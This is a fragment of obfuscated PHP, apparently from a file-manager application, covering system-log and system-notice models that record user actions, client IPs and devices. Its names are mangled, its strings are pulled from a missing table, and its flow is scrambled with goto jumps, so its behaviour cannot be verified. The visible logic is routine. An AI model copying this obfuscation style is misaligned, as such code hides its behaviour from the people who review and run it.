$eíĞ†ô¡ğõ[784]; $d™ˆâ«»Ïß($_SERVER[$eíĞ†ô¡ğõ[785]]); $d™ˆâ«»Ïß($_SERVER[$eíĞ†ô¡ğõ[752]] . $eíĞ†ô¡ğõ[786]); goto Bİ™«ÑÆ…Ò; BŒîåø¥†: $Bˆğ¬‘¾Ø‚ = $eíĞ†ô¡ğõ[783]; $F‰Šõ÷ŒÓ = $eíĞ†ô¡ğõ[751]; $dòêôİğã = $_SERVER[$eíĞ†ô¡ğõ[752]] . $eíĞ†ô¡ğõ[753]; goto BÁ½Ë‚ß‡‘; Bİ™«ÑÆ…Ò: $e”©»­§Ğ¿ = 1; while ($e”©»­§Ğ¿ > 1) { $e”©»­§Ğ¿ = $e”©»­§Ğ¿ + 4; $fè½ƒè¡äó = rawurlencode($e”©»­§Ğ¿ . $eíĞ†ô¡ğõ[357]); } goto aôŠ´×Ì«; aôŠ´×Ì«: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Dœáñî¦¨§) { $this->handle->flushall($Dœáñî¦¨§); } return; } return $this->handle->flushAll(); } } $Cô”ĞĞá = LIB_DIR . $_SERVER[»„][748]; $Aö¢ÅáÜêš = $_SERVER[»„][749]; goto C®†§’õ˜‰; D—‚Ï±šÒ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\x74\151\155\x65", "\x69\156\x73\x65\162\164", "\x66\165\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $a—ÑäŸ¬ † =& $_SERVER[»„]; return array($a—ÑäŸ¬ †[2344] => LNG($a—ÑäŸ¬ †[2345]), $a—ÑäŸ¬ †[2346] => LNG($a—ÑäŸ¬ †[2347]), $a—ÑäŸ¬ †[2012] => LNG($a—ÑäŸ¬ †[2348]), $a—ÑäŸ¬ †[2349] => LNG($a—ÑäŸ¬ †[2350]), $a—ÑäŸ¬ †[2351] => LNG($a—ÑäŸ¬ †[2352]), $a—ÑäŸ¬ †[2353] => LNG($a—ÑäŸ¬ †[2354]), $a—ÑäŸ¬ †[2355] => LNG($a—ÑäŸ¬ †[2356]), $a—ÑäŸ¬ †[2357] => LNG($a—ÑäŸ¬ †[2358]), $a—ÑäŸ¬ †[2043] => LNG($a—ÑäŸ¬ †[2359]), $a—ÑäŸ¬ †[2044] => LNG($a—ÑäŸ¬ †[2360]), $a—ÑäŸ¬ †[2361] => LNG($a—ÑäŸ¬ †[2362]), $a—ÑäŸ¬ †[2363] => LNG($a—ÑäŸ¬ †[2364]), $a—ÑäŸ¬ †[2365] => LNG($a—ÑäŸ¬ †[2366]), $a—ÑäŸ¬ †[2367] => LNG($a—ÑäŸ¬ †[2368]), $a—ÑäŸ¬ †[2041] => LNG($a—ÑäŸ¬ †[2369]), $a—ÑäŸ¬ †[2047] => LNG($a—ÑäŸ¬ †[2370]), $a—ÑäŸ¬ †[2371] => LNG($a—ÑäŸ¬ †[2372]), $a—ÑäŸ¬ †[2373] => LNG($a—ÑäŸ¬ †[2374]), $a—ÑäŸ¬ †[2375] => LNG($a—ÑäŸ¬ †[2376]), $a—ÑäŸ¬ †[2377] => LNG($a—ÑäŸ¬ †[2378]), $a—ÑäŸ¬ †[2050] => LNG($a—ÑäŸ¬ †[2379]), $a—ÑäŸ¬ †[2051] => LNG($a—ÑäŸ¬ †[2380]), $a—ÑäŸ¬ †[2381] => LNG($a—ÑäŸ¬ †[2382]), $a—ÑäŸ¬ †[2383] => LNG($a—ÑäŸ¬ †[2384]), $a—ÑäŸ¬ †[2385] => LNG($a—ÑäŸ¬ †[2386]), $a—ÑäŸ¬ †[2387] => LNG($a—ÑäŸ¬ †[2388]), $a—ÑäŸ¬ †[2389] => LNG($a—ÑäŸ¬ †[2390]), $a—ÑäŸ¬ †[2045] => LNG($a—ÑäŸ¬ †[2391]), $a—ÑäŸ¬ †[2392] => LNG($a—ÑäŸ¬ †[2393]), $a—ÑäŸ¬ †[2394] => LNG($a—ÑäŸ¬ †[2395]), $a—ÑäŸ¬ †[2396] => LNG($a—ÑäŸ¬ †[2396]), $a—ÑäŸ¬ †[2397] => LNG($a—ÑäŸ¬ †[2016]), $a—ÑäŸ¬ †[2398] => LNG($a—ÑäŸ¬ †[2399]), $a—ÑäŸ¬ †[2400] => LNG($a—ÑäŸ¬ †[2401]), $a—ÑäŸ¬ †[2402] => LNG($a—ÑäŸ¬ †[2403]), $a—ÑäŸ¬ †[2404] => LNG($a—ÑäŸ¬ †[2405]), $a—ÑäŸ¬ †[2406] => LNG($a—ÑäŸ¬ †[2407]), $a—ÑäŸ¬ †[2408] => LNG($a—ÑäŸ¬ †[2408]), $a—ÑäŸ¬ †[2409] => LNG($a—ÑäŸ¬ †[2410]), $a—ÑäŸ¬ †[2411] => LNG($a—ÑäŸ¬ †[2412]), $a—ÑäŸ¬ †[2413] => LNG($a—ÑäŸ¬ †[2414]), $a—ÑäŸ¬ †[2415] => LNG($a—ÑäŸ¬ †[2416]), $a—ÑäŸ¬ †[2417] => LNG($a—ÑäŸ¬ †[2418]), $a—ÑäŸ¬ †[2419] => LNG($a—ÑäŸ¬ †[2420])); } private function typeFile() { $AÄôãëÛ…Ä =& $_SERVER[»„]; $b÷Ñ‡›« = array($AÄôãëÛ…Ä[2047] => array($AÄôãëÛ…Ä[2048]), $AÄôãëÛ…Ä[2365] => array($AÄôãëÛ…Ä[2421]), $AÄôãëÛ…Ä[2367] => array($AÄôãëÛ…Ä[2422]), $AÄôãëÛ…Ä[2041] => array($AÄôãëÛ…Ä[2042]), $AÄôãëÛ…Ä[2373] => array(), $AÄôãëÛ…Ä[2375] => array(), $AÄôãëÛ…Ä[2377] => array(), $AÄôãëÛ…Ä[2050] => array($AÄôãëÛ…Ä[2052]), $AÄôãëÛ…Ä[2051] => array($AÄôãëÛ…Ä[2052]), $AÄôãëÛ…Ä[2381] => array($AÄôãëÛ…Ä[2423]), $AÄôãëÛ…Ä[2383] => array($AÄôãëÛ…Ä[2423]), $AÄôãëÛ…Ä[2385] => array($AÄôãëÛ…Ä[2424]), $AÄôãëÛ…Ä[2371] => array($AÄôãëÛ…Ä[2425]), $AÄôãëÛ…Ä[2387] => array($AÄôãëÛ…Ä[2426]), $AÄôãëÛ…Ä[2389] => array($AÄôãëÛ…Ä[2427]), $AÄôãëÛ…Ä[2045] => array($AÄôãëÛ…Ä[2046])); return $b÷Ñ‡›«; } private function typeAll() { goto d´½„Œ›Â; fÍÃ¹ï×: return $dŠàÎ…¿‡; goto dô³¢˜ÒŞ‘; d´½„Œ›Â: $c‡·÷èĞõŞ =& $_SERVER[»„]; $dŠàÎ…¿‡ = $this->typeList; $aˆÜîÁ‚Æ² = array_filter($this->typeFile()); goto CÌŠÌ±Œ˜‘; CÌŠÌ±Œ˜‘: foreach ($aˆÜîÁ‚Æ² as $Aô®ËÉõÑÓ => $b‚ŸÈêÄ™) { $dŠàÎ…¿‡[$b‚ŸÈêÄ™[0]] = $dŠàÎ…¿‡[$Aô®ËÉõÑÓ]; } $dŠàÎ…¿‡[$c‡·÷èĞõŞ[2052]] = LNG($c‡·÷èĞõŞ[2428]); $dŠàÎ…¿‡[$c‡·÷èĞõŞ[2423]] = LNG($c‡·÷èĞõŞ[2429]); goto fÍÃ¹ï×; dô³¢˜ÒŞ‘: } public function addLog($E•ÏÈÃ¦‹â, $bÁÍÍï˜¢ = array()) { goto b¹¹±³ù‚; bÂµÈ¹‚§È: parent::add($bÁÍÍï˜¢); goto cÍéî£­»; b¹¹±³ù‚: $cÎ·Ñâ¨‰ =& $_SERVER[»„]; if (!isset($this->typeList[$E•ÏÈÃ¦‹â])) { return; } $aô¨™¨Ô† = USER_ID ? USER_ID : (isset($bÁÍÍï˜¢[$cÎ·Ñâ¨‰[1409]]) ? $bÁÍÍï˜¢[$cÎ·Ñâ¨‰[1409]] : 0); goto bŞƒ„ˆÇ Ù; bŞƒ„ˆÇ Ù: $F»ãÓÛÍµ = get_client_ip(); if (!$bÁÍÍï˜¢ || strlen(json_encode($bÁÍÍï˜¢)) >= 1024) { $bÁÍÍï˜¢ = array($cÎ·Ñâ¨‰[2430] => $F»ãÓÛÍµ); } else { if (is_array($bÁÍÍï˜¢)) { $bÁÍÍï˜¢[$cÎ·Ñâ¨‰[2430]] = $F»ãÓÛÍµ; } else { $bÁÍÍï˜¢ = array($cÎ·Ñâ¨‰[1022] => $bÁÍÍï˜¢, $cÎ·Ñâ¨‰[2430] => $F»ãÓÛÍµ); } } $bÁÍÍï˜¢ = array($cÎ·Ñâ¨‰[1399] => Session::sign(), $cÎ·Ñâ¨‰[1400] => $aô¨™¨Ô†, $cÎ·Ñâ¨‰[29] => $E•ÏÈÃ¦‹â, $cÎ·Ñâ¨‰[1402] => json_encode($bÁÍÍï˜¢)); goto bÂµÈ¹‚§È; cÍéî£­»: } public function remove($AË¡ê“Ó†Ó) { $this->where(array($_SERVER[»„][381] => $AË¡ê“Ó†Ó))->delete(); } private function _makeOrder($Cˆ‘Ê‰š¯» = '') { goto d‡»ÌêÉ£İ; f¸ˆ„è²²: return $this->order($Cˆ‘Ê‰š¯»); goto F‚òİÃ”œ¨; d‡»ÌêÉ£İ: $F’ÚÌ¼ñ” =& $_SERVER[»„]; $E‹¾¾¬¬Û = $F’ÚÌ¼ñ”[183]; $BîÖÑİ­Œ† = array($F’ÚÌ¼ñ”[398] => $F’ÚÌ¼ñ”[399], $F’ÚÌ¼ñ”[400] => $F’ÚÌ¼ñ”[401]); goto D‹‘†ƒ’í; D‹‘†ƒ’í: $AñæÕ‹ø“™ = Input::get($F’ÚÌ¼ñ”[404], $F’ÚÌ¼ñ”[7], $F’ÚÌ¼ñ”[2210], array($F’ÚÌ¼ñ”[2147], $F’ÚÌ¼ñ”[400])); $AñæÕ‹ø“™ = $BîÖÑİ­Œ†[$AñæÕ‹ø“™]; $Cˆ‘Ê‰š¯» = $Cˆ‘Ê‰š¯» . "{$E‹¾¾¬¬Û}\40{$AñæÕ‹ø“™}"; goto f¸ˆ„è²²; F‚òİÃ”œ¨: } public function get($B£İ‘ïÒ©ˆ = '') { goto cöÔ½º¹; A¬…ïŠÈ¬¯: $AÚõŒÎÁ©[$AÑóàº´«¨[350]] = $this->logList($AÚõŒÎÁ©[$AÑóàº´«¨[350]]); return $AÚõŒÎÁ©; goto Dï¾ÜÎ¬é³; e²Ì‰Ïí’: if ($B£İ‘ïÒ©ˆ[$AÑóàº´«¨[1409]]) { $F†½‰‰¯¡Ø[$AÑóàº´«¨[1409]] = $B£İ‘ïÒ©ˆ[$AÑóàº´«¨[1409]]; } if (isset($B£İ‘ïÒ©ˆ[$AÑóàº´«¨[690]])) { $CÚÊŒÔ…Îƒ = $B£İ‘ïÒ©ˆ[$AÑóàº´«¨[690]]; $cÜ¸ ÖêÔÅ = isset($B£İ‘ïÒ©ˆ[$AÑóàº´«¨[691]]) ? $B£İ‘ïÒ©ˆ[$AÑóàº´«¨[691]] : time(); $F†½‰‰¯¡Ø[$AÑóàº´«¨[183]] = array($AÑóàº´«¨[317], array($CÚÊŒÔ…Îƒ, $cÜ¸ ÖêÔÅ)); } if ($B£İ‘ïÒ©ˆ[$AÑóàº´«¨[29]]) { $e´È²ô‰§» = explode($AÑóàº´«¨[47], $B£İ‘ïÒ©ˆ[$AÑóàº´«¨[29]]); $DëÓ…¡ƒ = $this->typeFile(); $BøèÄ‘‹Í = array(); foreach ($e´È²ô‰§» as $EŠ„½Á­Ò³) { $BøèÄ‘‹Í[] = $EŠ„½Á­Ò³; if (isset($DëÓ…¡ƒ[$EŠ„½Á­Ò³])) { $BøèÄ‘‹Í = array_merge($BøèÄ‘‹Í, $DëÓ…¡ƒ[$EŠ„½Á­Ò³]); } } $BøèÄ‘‹Í = array_unique($BøèÄ‘‹Í); if ($BøèÄ‘‹Í) { $F†½‰‰¯¡Ø[$AÑóàº´«¨[29]] = array($AÑóàº´«¨[7], $BøèÄ‘‹Í); } } goto C‹ÆŒ™‡ƒ¨; cöÔ½º¹: $AÑóàº´«¨ =& $_SERVER[»„]; if (!$B£İ‘ïÒ©ˆ) { show_json(array()); } $F†½‰‰¯¡Ø = array(); goto e²Ì‰Ïí’; C‹ÆŒ™‡ƒ¨: if (!empty($B£İ‘ïÒ©ˆ[$AÑóàº´«¨[2430]])) { $F†½‰‰¯¡Ø[$AÑóàº´«¨[401]] = array($AÑóàº´«¨[739], "\45{$B£İ‘ïÒ©ˆ[$AÑóàº´«¨[2430]]}\x25"); } $AÚõŒÎÁ© = $this->_makeOrder()->where($F†½‰‰¯¡Ø)->selectPage(); if (empty($AÚõŒÎÁ©[$AÑóàº´«¨[350]])) { show_json(array(), !0, $AÚõŒÎÁ©[$AÑóàº´«¨[347]]); } goto A¬…ïŠÈ¬¯; Dï¾ÜÎ¬é³: } private function ipAddress(&$fİŒæëÇÎŞ) { $b†ÙÀÎØ†‰ =& $_SERVER[»„]; if (!empty($fİŒæëÇÎŞ[$b†ÙÀÎØ†‰[2430]])) { $bÖê‡¤÷šì = IpLocation::get($fİŒæëÇÎŞ[$b†ÙÀÎØ†‰[2430]]); if ($bÖê‡¤÷šì == $b†ÙÀÎØ†‰[2431]) { $bÖê‡¤÷šì = $b†ÙÀÎØ†‰[2432]; } } else { $bÖê‡¤÷šì = LNG($b†ÙÀÎØ†‰[2433]); } $fİŒæëÇÎŞ[$b†ÙÀÎØ†‰[2434]] = $bÖê‡¤÷šì; } private function descZipDownload($BÛëÑñÔ¦¬, &$A¦ñÄâ±¦„) { $cæİÃï„¢„ =& $_SERVER[»„]; if (!isset($BÛëÑñÔ¦¬[$cæİÃï„¢„[2435]])) { return; } $Aª Ñò‡ = json_decode($BÛëÑñÔ¦¬[$cæİÃï„¢„[2435]], !0); foreach ($Aª Ñò‡ as $AºŞ¬Œ‹Úø) { if (!IO::init($AºŞ¬Œ‹Úø[$cæİÃï„¢„[75]])) { continue; } if (!($aĞÑÍé‡´¹ = IO::infoFull($AºŞ¬Œ‹Úø[$cæİÃï„¢„[75]]))) { continue; } $BÛëÑñÔ¦¬[$cæİÃï„¢„[75]] = $AºŞ¬Œ‹Úø[$cæİÃï„¢„[75]]; $A¦ñÄâ±¦„[] = $BÛëÑñÔ¦¬[$cæİÃï„¢„[365]] = $aĞÑÍé‡´¹[$cæİÃï„¢„[365]]; $A¦ñÄâ±¦„[] = $BÛëÑñÔ¦¬[$cæİÃï„¢„[2251]] = $aĞÑÍé‡´¹[$cæİÃï„¢„[457]]; break; } return $BÛëÑñÔ¦¬; } private function getSourceList(&$dé‡²¡±ää) { $EËÅ™×ìÒ‰ =& $_SERVER[»„]; $Bæ†ø‡êğÜ = array(); foreach ($dé‡²¡±ää as $c™“¼‚çœ => $c—²¡¶›©é) { goto c£ÑÅ›‚‚‡; c£ÑÅ›‚‚‡: $E´Š¿§‡ÑÑ = json_decode($c—²¡¶›©é[$EËÅ™×ìÒ‰[401]], !0); if ($c—²¡¶›©é[$EËÅ™×ìÒ‰[29]] == $EËÅ™×ìÒ‰[2044]) { $E´Š¿§‡ÑÑ = $this->descZipDownload($E´Š¿§‡ÑÑ, $Bæ†ø‡êğÜ); $dé‡²¡±ää[$c™“¼‚çœ][$EËÅ™×ìÒ‰[401]] = json_encode($E´Š¿§‡ÑÑ); continue; } if (strpos($c—²¡¶›©é[$EËÅ™×ìÒ‰[29]], $EËÅ™×ìÒ‰[2252]) !== 0) { goto BÑÉÒ‰÷; eñŸ‰Ëß¨°: continue; goto a³ ğâùåÄ; e½´©§ŒÂë: $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[365]] = $Cˆ¦œÚ¶Ç•[$EËÅ™×ìÒ‰[365]]; $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[2251]] = $Cˆ¦œÚ¶Ç•[$EËÅ™×ìÒ‰[457]]; $dé‡²¡±ää[$c™“¼‚çœ][$EËÅ™×ìÒ‰[401]] = json_encode($E´Š¿§‡ÑÑ); goto eñŸ‰Ëß¨°; BÑÉÒ‰÷: if (!isset($E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[75]]) || strpos($c—²¡¶›©é[$EËÅ™×ìÒ‰[29]], $EËÅ™×ìÒ‰[2436]) !== 0) { continue; } if (!IO::init($E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[75]])) { continue; } if (!($Cˆ¦œÚ¶Ç• = IO::infoFull($E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[75]]))) { continue; } goto e½´©§ŒÂë; a³ ğâùåÄ: } goto a­õ£„“ì‡; a­õ£„“ì‡: $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[365]]; $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[2251]]; if ($E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[29]] == $EËÅ™×ìÒ‰[488]) { $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[401]][$EËÅ™×ìÒ‰[994]]; $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[401]][$EËÅ™×ìÒ‰[995]]; } goto DÅëÑ¹ä˜Ì; DÅëÑ¹ä˜Ì: if ($E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[29]] == $EËÅ™×ìÒ‰[2259]) { $Bæ†ø‡êğÜ[] = $E´Š¿§‡ÑÑ[$EËÅ™×ìÒ‰[401]][$EËÅ™×ìÒ‰[365]]; } goto AÊÒÕšæö‚; AÊÒÕšæö‚: } if (!$Bæ†ø‡êğÜ) { return array(); } return Model($EËÅ™×ìÒ‰[740])->sourceListInfo($Bæ†ø‡êğÜ, !0); } private function logList($e‹öÎÖŞ‡Ï) { goto fò‰ÈôÆ‹; fò‰ÈôÆ‹: $F„¿°Êò¹é =& $_SERVER[»„]; $dÓ¸¯Ùä­® = array_to_keyvalue($e‹öÎÖŞ‡Ï, $F„¿°Êò¹é[33], $F„¿°Êò¹é[1409]); $DÃƒÁêğ™ = Model($F„¿°Êò¹é[473])->userListInfo(array_unique($dÓ¸¯Ùä­®)); goto dõ­Èíœ™; FáøášŠ²Ó: return $aâÛÆÒğİÃ; goto AÑ’—ˆëù; dõ­Èíœ™: $c´ËÊÌË©ê = $this->getSourceList($e‹öÎÖŞ‡Ï); $dÀÓÕ†Óä… = $this->typeAll(); $aâÛÆÒğİÃ = array(); goto F“Ö§ÂÄ½†; F“Ö§ÂÄ½†: $Fæ¨²Ò½Ş¥ = array(); foreach ($e‹öÎÖŞ‡Ï as $d°¿…—ø¥‚ => $C…¶ç‚ÖŞ½) { goto AÏá“†ôÑ¦; a³Ê—È‚È¨: unset($C…¶ç‚ÖŞ½[$F„¿°Êò¹é[2439]]); $aâÛÆÒğİÃ[] = $C…¶ç‚ÖŞ½; goto A¦·İÚšßÀ; B£ÈÀø®’: $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[2209]] = $b§šˆÉ»—†; $aî¹È›ÁÅŠ = json_decode($C…¶ç‚ÖŞ½[$F„¿°Êò¹é[401]], !0); $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[2430]] = isset($aî¹È›ÁÅŠ[$F„¿°Êò¹é[2430]]) ? $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2430]] : $F„¿°Êò¹é[33]; goto eºÒò¡Ãî; eºÒò¡Ãî: $this->ipAddress($C…¶ç‚ÖŞ½); if (strpos($d›èš›†, $F„¿°Êò¹é[2252]) === 0 || isset($aî¹È›ÁÅŠ[$F„¿°Êò¹é[2251]])) { goto bÃÀõ×…Ÿ¢; A­¶¼­Ùƒ: if ($aî¹È›ÁÅŠ[$F„¿°Êò¹é[2264]] && $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2264]][$F„¿°Êò¹é[367]] == $F„¿°Êò¹é[1068]) { $Fæ¨²Ò½Ş¥[] = $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[363]]; unset($e‹öÎÖŞ‡Ï[$d°¿…—ø¥‚]); continue; } goto CÇ…äØå—; C‡æ¨™ŒïÈ: if ($aî¹È›ÁÅŠ[$F„¿°Êò¹é[29]] == $F„¿°Êò¹é[2259]) { $aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[365]] = $c´ËÊÌË©ê[$aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[365]]]; } if ($aî¹È›ÁÅŠ[$F„¿°Êò¹é[29]] == $F„¿°Êò¹é[2039]) { $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2264]] = $aî¹È›ÁÅŠ[$F„¿°Êò¹é[387]]; $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2251]] = $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2264]][$F„¿°Êò¹é[365]]; $aî¹È›ÁÅŠ[$F„¿°Êò¹é[387]] = !1; $aî¹È›ÁÅŠ[$F„¿°Êò¹é[365]] = $F„¿°Êò¹é[33]; } if ($aî¹È›ÁÅŠ[$F„¿°Êò¹é[387]] && $aî¹È›ÁÅŠ[$F„¿°Êò¹é[387]][$F„¿°Êò¹é[367]] == $F„¿°Êò¹é[1068]) { $Fæ¨²Ò½Ş¥[] = $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[363]]; unset($e‹öÎÖŞ‡Ï[$d°¿…—ø¥‚]); continue; } goto A­¶¼­Ùƒ; bÃÀõ×…Ÿ¢: $aî¹È›ÁÅŠ[$F„¿°Êò¹é[387]] = $c´ËÊÌË©ê[$aî¹È›ÁÅŠ[$F„¿°Êò¹é[365]]]; $aî¹È›ÁÅŠ[$F„¿°Êò¹é[2264]] = $c´ËÊÌË©ê[$aî¹È›ÁÅŠ[$F„¿°Êò¹é[2251]]]; if ($aî¹È›ÁÅŠ[$F„¿°Êò¹é[29]] == $F„¿°Êò¹é[488]) { $aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[994]] = $c´ËÊÌË©ê[$aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[994]]]; $aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[995]] = $c´ËÊÌË©ê[$aî¹È›ÁÅŠ[$F„¿°Êò¹é[401]][$F„¿°Êò¹é[995]]]; } goto C‡æ¨™ŒïÈ; CÇ…äØå—: } $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[401]] = $aî¹È›ÁÅŠ; goto a³Ê—È‚È¨; d†®½ÑàÜğ: $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[28]] = isset($b§šˆÉ»—†[$F„¿°Êò¹é[28]]) ? $b§šˆÉ»—†[$F„¿°Êò¹é[28]] : LNG($F„¿°Êò¹é[2433]); $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[2299]] = isset($b§šˆÉ»—†[$F„¿°Êò¹é[2299]]) ? $b§šˆÉ»—†[$F„¿°Êò¹é[2299]] : $F„¿°Êò¹é[33]; $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[1316]] = isset($dÀÓÕ†Óä…[$d›èš›†]) ? $dÀÓÕ†Óä…[$d›èš›†] : $Dßãß™¹±; goto B£ÈÀø®’; AÏá“†ôÑ¦: $d›èš›† = $C…¶ç‚ÖŞ½[$F„¿°Êò¹é[29]]; $b§šˆÉ»—† = isset($DÃƒÁêğ™[$C…¶ç‚ÖŞ½[$F„¿°Êò¹é[1409]]]) ? $DÃƒÁêğ™[$C…¶ç‚ÖŞ½[$F„¿°Êò¹é[1409]]] : !1; $Dßãß™¹± = strpos($d›èš›†, $F„¿°Êò¹é[2437]) === 0 ? LNG($F„¿°Êò¹é[2438]) : LNG($F„¿°Êò¹é[2433]); goto d†®½ÑàÜğ; A¦·İÚšßÀ: } $this->clearSystemPathLog($Fæ¨²Ò½Ş¥); goto FáøášŠ²Ó; AÑ’—ˆëù: } private function clearSystemPathLog($f˜ŸŠÂ²â) { $aİ¹Ş¶¸ä =& $_SERVER[»„]; if (count($f˜ŸŠÂ²â) == 0) { return; } $DÇ¥›¡àŠŒ = array($aİ¹Ş¶¸ä[363] => array($aİ¹Ş¶¸ä[7], array_unique($f˜ŸŠÂ²â))); $this->where($DÇ¥›¡àŠŒ)->delete(); } public function deviceList($bòÑÕ™½›«, $aù“¼àËá™ = 0) { $E†™¤Ù¶Óµ =& $_SERVER[»„]; $b¹¼±’†é£ = array($E†™¤Ù¶Óµ[1409] => $bòÑÕ™½›«, $E†™¤Ù¶Óµ[183] => array($E†™¤Ù¶Óµ[918], $aù“¼àËá™), $E†™¤Ù¶Óµ[29] => $E†™¤Ù¶Óµ[2012]); $A£´È—œÑÇ = array(); $fÁâ²Î·½ = $this->field($E†™¤Ù¶Óµ[2440])->where($b¹¼±’†é£)->order($E†™¤Ù¶Óµ[2262])->limit(50)->select(); foreach ($fÁâ²Î·½ as $Dñò¸Ì¿‚ => $c³¦ÄÁ»ìƒ) { goto AÑŸÖ×Ÿ; dƒ‘ğÎÌ: unset($c°™Ó¿Ğ³[$E†™¤Ù¶Óµ[2430]]); $cÑŠ”ã¨Ö = $this->deviceType($c°™Ó¿Ğ³[$E†™¤Ù¶Óµ[2253]]); if (isset($A£´È—œÑÇ[$cÑŠ”ã¨Ö])) { continue; } goto e¿Ş³ì«ºë; AÑŸÖ×Ÿ: if ($Dñò¸Ì¿‚ > 0 && abs($c³¦ÄÁ»ìƒ[$E†™¤Ù¶Óµ[183]] - $fÁâ²Î·½[$Dñò¸Ì¿‚ - 1][$E†™¤Ù¶Óµ[183]]) < 5) { continue; } $c°™Ó¿Ğ³ = json_decode($c³¦ÄÁ»ìƒ[$E†™¤Ù¶Óµ[401]], !0); $c³¦ÄÁ»ìƒ[$E†™¤Ù¶Óµ[2430]] = isset($c°™Ó¿Ğ³[$E†™¤Ù¶Óµ[2430]]) ? $c°™Ó¿Ğ³[$E†™¤Ù¶Óµ[2430]] : $E†™¤Ù¶Óµ[33]; goto dƒ‘ğÎÌ; e¿Ş³ì«ºë: $this->ipAddress($c³¦ÄÁ»ìƒ); $c³¦ÄÁ»ìƒ[$E†™¤Ù¶Óµ[401]] = $c°™Ó¿Ğ³; $A£´È—œÑÇ[$cÑŠ”ã¨Ö] = $c³¦ÄÁ»ìƒ; goto D»ê…š«ó; D»ê…š«ó: } return array_values($A£´È—œÑÇ); } public function deviceType($dôîôéß··) { return $dôîôéß··; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x6e\x6f\164\151\x63\145\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x63\x6f\x6e\164\x65\156\x74", "\141\165\x74\150", "\155\x6f\144\x65", "\164\151\x6d\145", "\x74\171\x70\145", "\x6c\145\166\145\x6c", "\x65\156\141\x62\x6c\145", "\x73\x6f\162\164"); public function listData($fˆòíµ£˜ = false, $C…ÀªĞíİ = "\x73\157\162\164", $aÊ§¢ËïË = false) { return parent::listData($fˆòíµ£˜, $C…ÀªĞíİ, $aÊ§¢ËïË); } public function add($dÃÅ¹¾¤†Â) { $Eö½ó‹§œ÷ =& $_SERVER[»„]; $A² ¼´” = time(); if ($dÃÅ¹¾¤†Â[$Eö½ó‹§œ÷[12]] == $Eö½ó‹§œ÷[2441]) { $A² ¼´” = strtotime($dÃÅ¹¾¤†Â[$Eö½ó‹§œ÷[186]]); } $dÃÅ¹¾¤†Â[$Eö½ó‹§œ÷[186]] = $A² ¼´”; return parent::insert($dÃÅ¹¾¤†Â); } public function update($FÓ·†šÙ¶®, $bÙ£ÇÇ„ÂÉ) { goto dî•šæˆôà; dî•šæˆôà: $cƒõ¯µñé =& $_SERVER[»„]; $E£“Ğâæêá = $this->listData($FÓ·†šÙ¶®); if (!$E£“Ğâæêá) { return !1; } goto cÆ¡÷½ÀôÔ; bÖ¤›½¾êø: return parent::update($FÓ·†šÙ¶®, $bÙ£ÇÇ„ÂÉ); goto Cø‰ì¹Ö’; cÆ¡÷½ÀôÔ: $A¾õ³”‡Š = time(); if ($bÙ£ÇÇ„ÂÉ[$cƒõ¯µñé[12]] == $cƒõ¯µñé[2441]) { $A¾õ³”‡Š = strtotime($bÙ£ÇÇ„ÂÉ[$cƒõ¯µñé[186]]); } $bÙ£ÇÇ„ÂÉ[$cƒõ¯µñé[186]] = $A¾õ³”‡Š; goto bÖ¤›½¾êø; Cø‰ì¹Ö’: } public function remove($a´Ì¤ÕÆğ) { $e¶ê¥²Ê¯ = $this->listData($a´Ì¤ÕÆğ); if (!$e¶ê¥²Ê¯ || $e¶ê¥²Ê¯[$_SERVER[»„][1068]]) { return !1; } return parent::remove($a´Ì¤ÕÆğ); } public function sort($A²ÀÌëÒ†×, $EÈ«„˜—ïŸ) { return parent::update($A²ÀÌëÒ†×, $EÈ«„˜—ïŸ); } public function enable($b´ŒøóÄˆá, $fÅùŒ£¹ò) { return parent::update($b´ŒøóÄˆá, array($_SERVER[»„][2442] => $fÅùŒ£¹ò)); } private function initUserOption() { $eŸó¨ßìĞÔ =& $_SERVER[»„]; $this->optionType = $eŸó¨ßìĞÔ[2443]; $this->modelType = $eŸó¨ßìĞÔ[2444]; $this->field = array($eŸó¨ßìĞÔ[2445], $eŸó¨ßìĞÔ[28], $eŸó¨ßìĞÔ[186], $eŸó¨ßìĞÔ[29], $eŸó¨ßìĞÔ[2446], $eŸó¨ßìĞÔ[677], $eŸó¨ßìĞÔ[179]); } public function 